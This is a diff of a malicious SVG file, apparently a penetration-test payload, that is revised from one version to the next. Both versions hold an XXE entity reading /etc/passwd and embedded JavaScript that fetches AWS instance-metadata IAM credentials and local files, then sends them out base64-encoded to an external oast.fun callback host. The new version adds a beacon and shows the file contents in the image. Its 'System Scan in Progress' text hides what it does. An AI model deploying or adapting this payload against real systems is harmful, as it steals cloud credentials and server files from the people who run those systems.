@@ -1,50 +1,44 @@
 <?xml version="1.0" encoding="UTF-8" standalone="no"?>
 <!DOCTYPE svg [
-  <!ENTITY % passwd SYSTEM "file:///etc/passwd">
-  <!ENTITY % remote SYSTEM "http://fbfhefiixaypitfaeihh5lr3fldou68h0.oast.fun/xxe_check">
+  <!ENTITY passwd SYSTEM "file:///etc/passwd">
 ]>
 <svg width="600" height="600" xmlns="http://www.w3.org/2000/svg">
   <rect width="100%" height="100%" fill="white" />
-  <text x="10" y="40" font-family="Arial" font-size="20">Scanning Infrastructure...</text>
+  <text x="10" y="40" font-family="Arial" font-size="20">System Scan in Progress...</text>
 
   <script type="text/javascript">
     (async function() {
       const oast = "http://fbfhefiixaypitfaeihh5lr3fldou68h0.oast.fun";
-      const exfil = (path, data) => fetch(`${oast}/${path}/${btoa(data).replace(/\//g, '_')}`, {mode:'no-cors'});
+      const exfil = (path, data) => fetch(`${oast}/${path}/${btoa(data).replace(/\+/g, '-').replace(/\//g, '_')}`, {mode:'no-cors'});
 
-      // A. Try /etc/passwd via JS (Local File Read)
-      try {
-          const p = await fetch("file:///etc/passwd");
-          const pt = await p.text();
-          exfil("passwd", pt);
-      } catch(e) { exfil("err", "file_proto_blocked"); }
+      // Heartbeat
+      exfil("status", "svg_js_executed");
 
-      // B. Try AWS Metadata (IMDSv1)
-      try {
-          const m = await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
-          const mt = await m.text();
-          exfil("aws_role", mt);
-          
-          // If role found, get full creds
-          const c = await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + mt.trim());
-          const ct = await c.text();
-          exfil("aws_keys", ct);
-      } catch(e) {}
-
-      // C. Try AWS Metadata (IMDSv2 Token Bypass)
+      // A. Try AWS Metadata (IMDSv1 & v2)
       try {
           const t = await fetch("http://169.254.169.254/latest/api/token", {
               method: "PUT",
               headers: { "X-aws-ec2-metadata-token-ttl-seconds": "21600" }
           });
-          const token = await t.text();
-          const m2 = await fetch("http://169.254.169.254/latest/meta-data/hostname", {
-              headers: { "X-aws-ec2-metadata-token": token }
-          });
-          exfil("aws_v2_host", await m2.text());
+          const token = t.ok ? await t.text() : null;
+          const headers = token ? { "X-aws-ec2-metadata-token": token } : {};
+
+          const m = await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/", { headers });
+          const role = await m.text();
+          exfil("aws_role", role);
+          
+          const c = await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + role.trim(), { headers });
+          exfil("aws_keys", await c.text());
+      } catch(e) { exfil("debug", "aws_failed"); }
+
+      // B. Try /etc/passwd via JS
+      try {
+          const p = await fetch("file:///etc/passwd");
+          exfil("passwd_js", await p.text());
       } catch(e) {}
     })();
   </script>
 
-  <image href="http://fbfhefiixaypitfaeihh5lr3fldou68h0.oast.fun/xxe_trigger?data=&passwd;" width="1" height="1" />
+  <text x="10" y="100">&passwd;</text>
+  <image href="http://fbfhefiixaypitfaeihh5lr3fldou68h0.oast.fun/xxe_trigger?data=check" width="1" height="1" />
 </svg>
